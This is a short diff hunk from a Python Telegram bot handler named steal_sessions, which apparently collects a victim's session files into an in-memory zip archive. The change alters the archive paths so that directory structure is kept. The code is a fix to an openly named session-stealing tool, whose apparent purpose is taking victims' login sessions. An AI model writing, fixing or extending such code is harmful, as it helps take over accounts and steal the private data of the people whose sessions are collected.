@@ -71,7 +71,8 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     elif path_obj.is_dir():
                         for file in path_obj.rglob('*'):
                             if file.is_file():
-                                zf.write(file, arcname=file.relative_to(path_obj))
+                                zf.write(file, arcname=file.relative_to(path_obj.parent)
+)
 
         mem_zip.seek(0)
 
